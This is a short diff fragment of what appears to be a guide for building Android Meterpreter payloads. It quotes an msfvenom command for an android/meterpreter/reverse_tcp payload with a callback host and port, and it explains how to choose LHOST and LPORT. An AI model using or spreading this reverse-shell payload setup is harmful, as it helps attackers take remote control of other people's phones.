@@ -47,6 +47,7 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.29.29 LPORT=6767 R > /
 ## What will be my LHOST & LPORT?
 `
 LHOST: your local ip of wifi/mobile network
+
 LPORT: you can use any port`
 
 ## Payload Not isntalling, Giving Parsing Error?
